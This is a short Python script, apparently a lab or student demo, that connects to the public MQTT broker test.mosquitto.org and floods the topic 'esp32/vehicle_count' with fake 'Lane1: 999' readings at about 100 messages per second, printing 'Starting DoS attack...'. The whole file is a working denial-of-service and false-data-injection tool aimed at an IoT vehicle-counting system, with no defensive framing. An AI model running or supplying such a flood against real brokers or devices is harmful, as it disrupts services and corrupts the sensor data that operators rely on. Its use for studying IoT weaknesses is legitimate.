import paho.mqtt.client as mqtt
import time

broker = "test.mosquitto.org"
topic = "esp32/vehicle_count"
client = mqtt.Client(protocol=mqtt.MQTTv311)


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker")
    else:
        print(f"Failed to connect: {rc}")


client.on_connect = on_connect
client.connect(broker, 1883, 60)
client.loop_start()

print("Starting DoS attack...")
try:
    while True:
        client.publish(topic, "Lane1: 999")  # Flood with fake data
        time.sleep(0.01)  # High frequency (100 msg/s)
except KeyboardInterrupt:
    print("DoS attack stopped")
    client.loop_stop()
    client.disconnect()
